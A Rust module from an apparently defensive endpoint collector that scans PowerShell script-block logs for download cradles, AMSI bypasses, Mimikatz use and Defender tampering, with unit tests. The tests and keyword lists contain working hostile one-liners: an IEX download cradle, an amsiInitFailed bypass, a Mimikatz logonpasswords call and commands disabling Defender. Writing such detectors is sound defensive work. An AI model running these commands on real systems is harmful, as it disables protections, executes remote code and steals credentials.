//! PowerShell script-block (event 4104) inspection.
//!
//! Script text can contain credentials, so it is evaluated on the host and
//! never forwarded: the collector drops the raw record and emits only the
//! findings below, whose evidence carries the SHA-256 and length of the block
//! and the rule that matched, not the text. Matching is deliberately narrow
//! (a script block is arbitrary module code, so loose substring rules such as
//! the process command-line ones would fire on benign scripts).

use sha2::{Digest, Sha256};
use trapd_schema::{DetectionData, DetectionMode};

/// Longest script text inspected; the rest is ignored.
pub const MAX_SCRIPT_BYTES: usize = 64 * 1024;

fn whole_word(haystack: &str, word: &str) -> bool {
    let b = haystack.as_bytes();
    haystack.match_indices(word).any(|(i, _)| {
        let before = i == 0 || !(b[i - 1].is_ascii_alphanumeric() || b[i - 1] == b'_');
        let end = i + word.len();
        let after = end >= b.len() || !(b[end].is_ascii_alphanumeric() || b[end] == b'_');
        before && after
    })
}

/// `(rule id, title, category, tactic, technique, confidence)`.
type Rule = (
    &'static str,
    &'static str,
    &'static str,
    &'static str,
    &'static str,
    u8,
);

fn finding(rule: Rule, digest: &str, len: usize) -> DetectionData {
    let (rule, title, category, tactic, technique, confidence) = rule;
    DetectionData {
        rule_id: rule.into(),
        title: title.into(),
        category: category.into(),
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence,
        subject: format!("scriptblock:{}", &digest[..16]),
        detail: format!("{title} (PowerShell script block, content not retained)"),
        evidence: serde_json::json!({
            "event_id": 4104,
            "script_sha256": digest,
            "script_bytes": len,
            "source": "eventlog",
        }),
        mode: None::<DetectionMode>,
        ..Default::default()
    }
}

/// Findings for one script block. Empty for benign or oversized-irrelevant text.
pub fn inspect_script_block(text: &str) -> Vec<DetectionData> {
    let mut end = text.len().min(MAX_SCRIPT_BYTES);
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    let text = &text[..end];
    if text.trim().is_empty() {
        return Vec::new();
    }
    let digest = format!("{:x}", Sha256::digest(text.as_bytes()));
    let lower = text.to_ascii_lowercase();
    let has = |needles: &[&str]| needles.iter().any(|n| lower.contains(n));
    let mut out = Vec::new();

    let downloads = has(&[
        "downloadstring",
        "downloadfile",
        "downloaddata",
        "net.webclient",
        "start-bitstransfer",
    ]) || (has(&["invoke-webrequest", "invoke-restmethod"])
        && (lower.contains("http://") || lower.contains("https://")));
    let executes = whole_word(&lower, "iex") || lower.contains("invoke-expression");
    if downloads && executes {
        out.push(finding(
            (
                "execution.powershell_download_exec",
                "PowerShell script downloads and executes code",
                "execution",
                "TA0002 Execution",
                "T1105",
                85,
            ),
            &digest,
            text.len(),
        ));
    }
    if has(&["amsiutils", "amsiinitfailed", "amsicontext"])
        && has(&["setvalue", "[ref]", "getfield", "virtualprotect"])
    {
        out.push(finding(
            (
                "defense_evasion.amsi_bypass",
                "AMSI bypass attempt",
                "defense_evasion",
                "TA0005 Defense Evasion",
                "T1562.001",
                90,
            ),
            &digest,
            text.len(),
        ));
    }
    if has(&[
        "invoke-mimikatz",
        "sekurlsa::",
        "lsadump::",
        "kerberos::golden",
    ]) {
        out.push(finding(
            (
                "credential_access.mimikatz",
                "Mimikatz syntax in a script block",
                "credential_access",
                "TA0006 Credential Access",
                "T1003.001",
                95,
            ),
            &digest,
            text.len(),
        ));
    }
    let defender_off = lower.contains("set-mppreference")
        && lower.contains("$true")
        && has(&[
            "disablerealtimemonitoring",
            "disableioavprotection",
            "disablebehaviormonitoring",
            "disablescriptscanning",
        ]);
    let defender_excl = lower.contains("add-mppreference")
        && has(&["-exclusionpath", "-exclusionprocess", "-exclusionextension"]);
    if defender_off || defender_excl {
        out.push(finding(
            (
                "defense_evasion.defender_tamper",
                "Microsoft Defender protection disabled or excluded",
                "defense_evasion",
                "TA0005 Defense Evasion",
                "T1562.001",
                85,
            ),
            &digest,
            text.len(),
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(t: &str) -> Vec<String> {
        inspect_script_block(t)
            .into_iter()
            .map(|d| d.rule_id)
            .collect()
    }

    #[test]
    fn download_cradle_is_detected() {
        assert_eq!(
            ids("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"),
            ["execution.powershell_download_exec"]
        );
    }

    #[test]
    fn iex_inside_another_word_is_not_execution() {
        assert!(
            ids("$index = 1; (New-Object Net.WebClient).DownloadString('http://x')").is_empty()
        );
    }

    #[test]
    fn amsi_bypass_needs_both_the_target_and_the_technique() {
        assert_eq!(
            ids("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"),
            ["defense_evasion.amsi_bypass"]
        );
        assert!(ids("# notes about amsiutils").is_empty());
    }

    #[test]
    fn mimikatz_and_defender_tamper() {
        assert_eq!(
            ids("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"),
            ["credential_access.mimikatz"]
        );
        assert_eq!(
            ids("Set-MpPreference -DisableRealtimeMonitoring $true"),
            ["defense_evasion.defender_tamper"]
        );
        assert_eq!(
            ids("Add-MpPreference -ExclusionPath C:\\x"),
            ["defense_evasion.defender_tamper"]
        );
    }

    #[test]
    fn evidence_never_contains_the_script_text() {
        let secret = "Password123-do-not-leak";
        let d = inspect_script_block(&format!(
            "$p='{secret}'; IEX (New-Object Net.WebClient).DownloadString('http://x')"
        ));
        assert_eq!(d.len(), 1);
        let dump = serde_json::to_string(&d[0]).unwrap();
        assert!(!dump.contains(secret), "{dump}");
        assert_eq!(d[0].evidence["script_sha256"].as_str().unwrap().len(), 64);
        assert!(d[0].subject.starts_with("scriptblock:"));
    }

    #[test]
    fn benign_empty_and_oversized_input_is_safe() {
        assert!(ids("Get-ChildItem C:\\ | Sort-Object Length").is_empty());
        assert!(ids("   ").is_empty());
        let big = "é".repeat(MAX_SCRIPT_BYTES);
        let _ = inspect_script_block(&big);
    }
}
